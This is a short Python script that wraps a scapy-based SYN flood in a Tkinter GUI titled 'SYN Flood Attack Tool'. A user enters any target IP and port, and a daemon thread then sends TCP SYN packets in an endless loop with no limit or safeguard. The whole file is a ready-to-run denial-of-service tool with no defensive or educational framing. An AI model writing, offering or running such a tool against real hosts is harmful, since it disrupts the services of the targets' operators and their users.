import tkinter as tk
from scapy.all import *
import threading

def syn_flood(target_ip, target_port):
    ip = IP(dst=target_ip)
    syn = TCP(dport=target_port, flags="S", seq=1000)
    pkt = ip/syn
    while True:
        send(pkt, verbose=0)  # Send SYN packets continuously

def start_attack():
    target_ip = ip_entry.get()
    target_port = int(port_entry.get())
    attack_thread = threading.Thread(target=syn_flood, args=(target_ip, target_port))
    attack_thread.daemon = True
    attack_thread.start()
    status_label.config(text=f"Attack started on {target_ip}:{target_port}")

# Set up the GUI window
window = tk.Tk()
window.title("SYN Flood Attack Tool")
window.geometry("400x200")

# Add labels and entry fields
ip_label = tk.Label(window, text="TARGET IP:")
ip_label.pack(pady=10)
ip_entry = tk.Entry(window)
ip_entry.pack(pady=10)

port_label = tk.Label(window, text="PORT:")
port_label.pack(pady=10)
port_entry = tk.Entry(window)
port_entry.pack(pady=10)

# Start attack button
attack_button = tk.Button(window, text="Start Attack", command=start_attack)
attack_button.pack(pady=20)

# Status label to show the status of the attack
status_label = tk.Label(window, text="")
status_label.pack(pady=10)

# Run the GUI
window.mainloop()
